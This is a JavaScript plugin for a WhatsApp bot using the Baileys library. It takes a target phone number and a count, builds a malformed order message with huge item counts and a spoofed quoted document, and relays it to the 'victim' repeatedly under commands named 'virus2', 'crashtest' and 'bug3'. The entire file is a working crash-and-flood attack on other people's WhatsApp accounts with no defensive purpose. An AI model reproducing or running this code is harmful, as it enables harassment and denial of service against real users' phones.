const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
import fs from 'fs'
import { delay } from '@adiwajshing/baileys'
let handler = async (m, { conn, text, args, usedPrefix, command }) => {	
    
    let victim = text.split("/")[0]
    let count = text.split("/")[1]


    let victim2 = victim.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    let count2 = count*3


var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
const doc = { 
key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {})},
"message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple•MD`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ...`,
"jpegThumbnail": fs.readFileSync('./Menu2.jpg'),
"orderTitle": `© 😋`,
"sellerJid": "593991398786@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: victim2, quoted: doc })



const sik =  await conn.sendMessage(m.chat, { text : `Bot attacking to ${victim}\n${count}M   `} , { quoted: m } )

await conn.sendMessage( m.chat , {
    react: { text: `🕛` , key: sik.key },
})


for (let i = 0; i< count2; i++){

   
conn.relayMessage(victim2, order.message, { messageId: order.key.id })

await delay (20*1000)


}

await conn.sendMessage( m.chat , {
    react: { text: `✅` , key: sik.key },
})


}
handler.command = ['virus2','crashtest','bug3'] 
handler.rowner = true
export default handler
